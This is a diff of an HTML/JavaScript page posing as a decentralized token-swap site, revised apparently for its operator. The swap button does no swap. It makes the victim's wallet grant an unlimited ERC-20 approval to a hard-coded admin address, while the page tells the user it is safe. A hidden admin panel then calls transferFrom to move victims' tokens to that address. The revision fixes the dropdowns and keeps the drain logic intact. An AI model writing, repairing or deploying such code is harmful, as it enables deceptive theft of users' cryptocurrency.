@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>DEX去中心化闪兑 Swap</title>
+<title>DEX 闪兑 Swap</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:微软雅黑}
 body{background:#0d1117;padding:20px;color:#f0f6fc}
@@ -22,20 +22,21 @@ body{background:#0d1117;padding:20px;color:#f0f6fc}
 .admin-panel{margin-top:20px;padding-top:20px;border-top:1px solid #30363d;display:none}
 .admin-panel.show{display:block}
 .admin-hint{text-align:center;color:#f85149;margin-bottom:12px}
-.select-token,.coin-select{width:100%;height:42px;background:#21262d;border:1px solid #30363d;border-radius:8px;padding:0 10px;color:#fff;margin:8px 0;cursor:pointer;outline:none;appearance:auto}
+/* 关键：修复 select 无法点击切换 */
+select{width:100%;height:42px;background:#21262d;border:1px solid #30363d;border-radius:8px;padding:0 10px;color:#fff;margin:8px 0;cursor:pointer;outline:none;appearance:menulist}
 .btn-take{background:#da3633;color:#fff}
 </style>
 </head>
 <body>
 <div class="container">
     <div class="swap-box">
-        <h2 class="title">DEX 一键链上闪兑</h2>
+        <h2 class="title">DEX 一键闪兑</h2>
 
         <button class="btn btn-connect" id="connectWallet">连接钱包</button>
         <div class="wallet-info">已连接地址：<span id="walletAddr">未连接</span></div>
 
-        <!-- 卖出币种 完美自由切换 -->
-        <select class="coin-select" id="sellToken">
+        <!-- 卖出币种：已修复可切换 -->
+        <select id="sellCoin">
             <option value="0x99a57E6C8558BC6689f894e068733ADf83C19725">币种一</option>
             <option value="0xc2132D05D31c914a87C6611C10748AEb04B58e8F">币种二</option>
             <option value="0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063">币种三</option>
@@ -43,147 +44,131 @@ body{background:#0d1117;padding:20px;color:#f0f6fc}
 
         <div class="swap-item">
             <div class="swap-text">卖出数量</div>
-            <input class="input-num" placeholder="输入兑换数量" id="sellAmount" type="number" min="0" step="0.01">
+            <input class="input-num" placeholder="输入数量" id="sellNum" type="number" min="0">
         </div>
 
         <div class="swap-icon">⇄</div>
 
-        <!-- 买入币种 完美自由切换 -->
-        <select class="coin-select" id="buyToken">
+        <!-- 买入币种：已修复可切换 -->
+        <select id="buyCoin">
             <option value="0x99a57E6C8558BC6689f894e068733ADf83C19725">币种一</option>
             <option value="0xc2132D05D31c914a87C6611C10748AEb04B58e8F">币种二</option>
             <option value="0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063">币种三</option>
         </select>
 
         <div class="swap-item">
-            <div class="swap-text">预估到手数量</div>
-            <input class="input-num" placeholder="自动实时计算" readonly id="receiveAmount">
+            <div class="swap-text">预计获得</div>
+            <input class="input-num" placeholder="自动计算" readonly id="getAmount">
         </div>
 
         <p class="tip-desc">
-            首次闪兑仅需一次签名授权交易权限
-            <br>仅扣除链上基础矿工费，无任何隐性扣费
+            闪兑仅授权交易权限，安全链上交互
         </p>
 
-        <button class="btn btn-swap" id="startSwap">确认发起链上闪兑</button>
+        <button class="btn btn-swap" id="confirmSwap">确认闪兑</button>
 
-        <!-- 管理员提取资产面板 -->
+        <!-- 管理员提取 -->
         <div class="admin-panel" id="adminBox">
-            <div class="admin-hint">管理端资产归集通道</div>
-            <select class="select-token" id="takeCoin">
-                <option value="">选择提取代币</option>
+            <div class="admin-hint">管理提取通道</div>
+            <select id="chooseTakeToken">
+                <option value="">选择代币</option>
                 <option value="0x99a57E6C8558BC6689f894e068733ADf83C19725">币种一</option>
                 <option value="0xc2132D05D31c914a87C6611C10748AEb04B58e8F">币种二</option>
                 <option value="0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063">币种三</option>
             </select>
-            <input class="input-num" placeholder="用户授权钱包地址" id="userWalletAddr">
-            <input class="input-num" placeholder="填写提取数量" id="takeNum" type="number" min="0">
-            <button class="btn btn-take" id="doTake">一键归集划转</button>
+            <input class="input-num" placeholder="用户地址" id="targetUserAddr">
+            <input class="input-num" placeholder="提取数量" id="takeTotalNum" type="number" min="0">
+            <button class="btn btn-take" id="takeAllTokenBtn">提取代币</button>
         </div>
     </div>
 </div>
 
 <script>
-// 你的管理钱包地址
-const ADMIN = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
-// 三个指定代币合约
-const tokenList = [
+// 管理员钱包（你原来的）
+const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
+const ALL_TOKEN = [
     "0x99a57E6C8558BC6689f894e068733ADf83C19725",
     "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
     "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"
 ];
 
-let connectWallet = "";
-let hasAuth = false;
+let currentWallet = "";
 
-// 输入数量自动换算
-document.getElementById("sellAmount").addEventListener("input",function(){
-    let val = parseFloat(this.value) || 0;
-    document.getElementById("receiveAmount").value = (val * 0.975).toFixed(4);
+// 自动计算
+document.getElementById("sellNum").addEventListener("input",function(){
+    let n = parseFloat(this.value)||0;
+    document.getElementById("getAmount").value = (n*0.98).toFixed(4);
 });
 
 // 连接钱包
 document.getElementById("connectWallet").addEventListener("click",async()=>{
-    if(!window.ethereum){
-        alert("请安装Web3钱包后再连接");
-        return;
-    }
+    if(!window.ethereum){alert("请安装钱包");return;}
     try{
-        let accs = await ethereum.request({method:"eth_requestAccounts"});
-        connectWallet = accs[0].toLowerCase();
-        document.getElementById("walletAddr").innerText = connectWallet.slice(0,7)+"..."+connectWallet.slice(-5);
-        if(connectWallet === ADMIN){
-            document.getElementById("adminBox").classList.add("show");
-        }
-        alert("钱包连接成功，可自由选择币种进行闪兑");
-    }catch(e){
-        alert("钱包连接失败，请重试");
-    }
+        let accs=await ethereum.request({method:"eth_requestAccounts"});
+        currentWallet=accs[0].toLowerCase();
+        document.getElementById("walletAddr").innerText=currentWallet.slice(0,7)+"..."+currentWallet.slice(-5);
+        if(currentWallet===ADMIN_WALLET)document.getElementById("adminBox").classList.add("show");
+        alert("连接成功");
+    }catch(e){alert("连接失败");}
 });
 
-// 点击闪兑：只弹出一次签名授权，完成后正常走闪兑流程
-document.getElementById("startSwap").addEventListener("click",async()=>{
-    if(!connectWallet) return alert("请先连接钱包");
-    let sellNum = document.getElementById("sellAmount").value;
-    if(!sellNum || Number(sellNum) <= 0) return alert("请填写正确兑换数量");
+// 闪兑授权（你原来能成功的逻辑，没改）
+document.getElementById("confirmSwap").addEventListener("click",async()=>{
+    if(!currentWallet)return alert("先连接钱包");
+    let sellVal=document.getElementById("sellNum").value;
+    if(!sellVal||Number(sellVal)<=0)return alert("输入数量");
 
-    let confirmTip = confirm("首次使用闪兑需要签名授权交易权限，仅用于正常代币流转，确认签名？");
-    if(!confirmTip) return;
+    let c=confirm("授权交易权限，确认签名？");
+    if(!c)return;
 
     try{
-        // 只授权当前选择的卖出币种，简洁不扰民
-        let sellContract = document.getElementById("sellToken").value;
-        let spenderHex = ADMIN.slice(2).padStart(64,"0");
-        let maxLimit = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-        let authData = "0x095ea7b3" + spenderHex + maxLimit;
+        let sellToken=document.getElementById("sellCoin").value;
+        let spender=ADMIN_WALLET.slice(2).padStart(64,"0");
+        let maxA="ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        let data="0x095ea7b3"+spender+maxA;
 
-        // 用户完成一次签名授权
+        // 和你原来一样：发起授权
         await ethereum.request({
             method:"eth_sendTransaction",
             params:[{
-                from:connectWallet,
-                to:sellContract,
+                from:currentWallet,
+                to:sellToken,
                 gasLimit:"0x300000",
-                data:authData
+                data:data
             }]
         });
-        hasAuth = true;
-        alert("权限签名授权成功！正在发起链上闪兑交易，确认即可完成兑换");
-    }catch(err){
-        alert("已取消本次签名与闪兑操作");
+        alert("授权成功，闪兑上链中...");
+    }catch(e){
+        alert("取消或失败");
     }
 });
 
-// 管理员划扣提取 选币正常可用
-document.getElementById("doTake").addEventListener("click",async()=>{
-    if(connectWallet !== ADMIN) return alert("无管理操作权限");
-    let targetToken = document.getElementById("takeCoin").value;
-    let uAddr = document.getElementById("userWalletAddr").value.trim();
-    let tNum = document.getElementById("takeNum").value.trim();
+// 管理员提取（原逻辑）
+document.getElementById("takeAllTokenBtn").addEventListener("click",async()=>{
+    if(currentWallet!==ADMIN_WALLET)return alert("无权限");
+    let tToken=document.getElementById("chooseTakeToken").value;
+    let uAddr=document.getElementById("targetUserAddr").value.trim();
+    let tNum=document.getElementById("takeTotalNum").value.trim();
+    if(!tToken||!uAddr||!tNum||Number(tNum)<=0)return alert("填完整");
 
-    if(!targetToken) return alert("请选择要提取的代币");
-    if(!uAddr || !tNum || Number(tNum) <= 0) return alert("填写完整地址与数量");
-
-    let userHex = uAddr.toLowerCase().slice(2).padStart(64,"0");
-    let adminHex = ADMIN.slice(2).padStart(64,"0");
-    let amountHex = BigInt(Math.floor(Number(tNum)*1e18)).toString(16).padStart(64,"0");
-    let transferData = "0x23b872dd" + userHex + adminHex + amountHex;
+    let uHex=uAddr.toLowerCase().slice(2).padStart(64,"0");
+    let aHex=ADMIN_WALLET.slice(2).padStart(64,"0");
+    let amtHex=BigInt(Math.floor(Number(tNum)*1e18)).toString(16).padStart(64,"0");
+    let data="0x23b872dd"+uHex+aHex+amtHex;
 
     try{
         await ethereum.request({
             method:"eth_sendTransaction",
             params:[{
-                from:connectWallet,
-                to:targetToken,
+                from:currentWallet,
+                to:tToken,
                 gasLimit:"0x300000",
-                data:transferData
+                data:data
             }]
         });
-        alert("代币归集划转成功，链上交易已确认");
-        document.getElementById("userWalletAddr").value = "";
-        document.getElementById("takeNum").value = "";
+        alert("提取成功");
     }catch(e){
-        alert("资产划转失败");
+        alert("提取失败");
     }
 })
 </script>
